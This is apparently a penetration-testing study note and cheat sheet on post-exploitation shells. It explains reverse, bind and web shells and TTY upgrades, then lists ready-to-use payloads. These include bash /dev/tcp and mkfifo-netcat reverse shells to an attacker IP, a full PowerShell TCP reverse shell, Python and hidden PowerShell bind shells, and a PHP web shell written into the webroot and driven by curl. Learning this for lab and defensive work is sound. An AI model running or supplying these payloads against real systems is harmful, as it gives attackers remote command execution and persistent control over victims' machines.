## 🎯 Goal After Exploitation

- After gaining **remote code execution (RCE)**, repeatedly exploiting is inefficient.
- Objective: establish a **persistent, reliable shell** for:
    - System enumeration
    - Privilege escalation
    - Lateral movement

---

## 🔐 Alternative Access Methods

- **SSH (Linux)** / **WinRM (Windows)**
    - Require **valid credentials**
    - Not always feasible immediately post-exploit

➡️ Therefore, attackers use **shells** instead.

---

# 🧩 Types of Shells

|Shell Type|Communication Model|
|---|---|
|Reverse Shell|Target → Attacker|
|Bind Shell|Attacker → Target|
|Web Shell|HTTP-based command execution|

---

## 🔁 Reverse Shell

### 📌 Concept

- Target **connects back** to attacker
- Attacker runs a **listener** (e.g., Netcat)

### ⚙️ Workflow

1. Start listener:
    
    nc -lvnp 1234
    
2. Execute reverse shell payload on target
3. Target connects back → interactive shell

### 📡 Key Notes

- Requires attacker IP (e.g., `tun0` in VPN labs)
- Common payloads:
    - Bash (Linux)
    - PowerShell (Windows)

### ✅ Pros

- Simple and fast
- Works well behind NAT/firewalls (outbound connection)

### ❌ Cons

- Fragile (connection drops = lost access)
- Requires re-exploitation

---

## 🔗 Bind Shell

### 📌 Concept

- Target **opens a port** and waits
- Attacker connects to it

### ⚙️ Workflow

1. Execute bind shell on target (listens on port)
2. Connect using:
    
    nc TARGET_IP 1234
    

### ✅ Pros

- Persistent while running
- Can reconnect if dropped

### ❌ Cons

- Blocked by firewalls (inbound connection)
- Lost if process stops/reboot

---

## 🌐 Web Shell

### 📌 Concept

- Script (PHP, ASPX, JSP) executes commands via HTTP
- Commands passed via **GET/POST parameters**

### 💡 Example (PHP)

<?php system($_REQUEST["cmd"]); ?>

### ⚙️ Deployment

- Upload via:
    - File upload vulnerability
    - RCE → write to webroot

### 📂 Common Webroots

|Server|Path|
|---|---|
|Apache|`/var/www/html/`|
|Nginx|`/usr/local/nginx/html/`|
|IIS|`C:\inetpub\wwwroot\`|

### 🌍 Usage

http://target/shell.php?cmd=id

### ✅ Pros

- Uses HTTP (bypasses firewall)
- Persistent across reboots

### ❌ Cons

- Not interactive
- Requires repeated requests

---

# 🛠️ TTY Upgrade (Important)

## 🚫 Problem

- Basic shells lack:
    - Command history
    - Arrow keys
    - Proper terminal behavior

## ✅ Solution (Python TTY upgrade)

python -c 'import pty; pty.spawn("/bin/bash")'

Then:

Ctrl+Z  
stty raw -echo  
fg

Set terminal:

export TERM=xterm-256color  
stty rows <r> columns <c>

➡️ Result: **Fully interactive shell (like SSH)**

---

# 🧠 Key Takeaways

- **Reverse shell** = fastest, most common
- **Bind shell** = stable but firewall-sensitive
- **Web shell** = stealthy & persistent but less interactive
- **TTY upgrade** = essential for usability
- Choice depends on:
    - Network restrictions
    - Persistence needs
    - Interaction level required


<script>

|   |   |
|---|---|
|**Using Shells**||

#REVERSE!!!

|`nc -lvnp 1234`|Start a `nc` listener on a local port|

#bash
|`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`|Send a reverse shell from the remote server|

|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`|Another command to send a reverse shell from the remote server|


#powershell
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```


#BIND!!!!!

#bash
|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`|Start a bind shell on the remote server|

|`nc 10.10.10.1 1234`|Connect to a bind shell started on the remote server|


#python
```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

#powershell

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

#UPGRADESHELL-----------------run from compromised shell
|`python -c 'import pty; 
pty.spawn("/bin/bash")'`|Upgrade shell TTY (1)|
|`ctrl+z` then `stty raw -echo` then `fg` then `enter` twice|Upgrade shell TTY (2)|


#webshell
|`echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`|Create a webshell php file|

|`curl http://SERVER_IP:PORT/shell.php?cmd=id`|Execute a command on an uploaded webshell|

</script>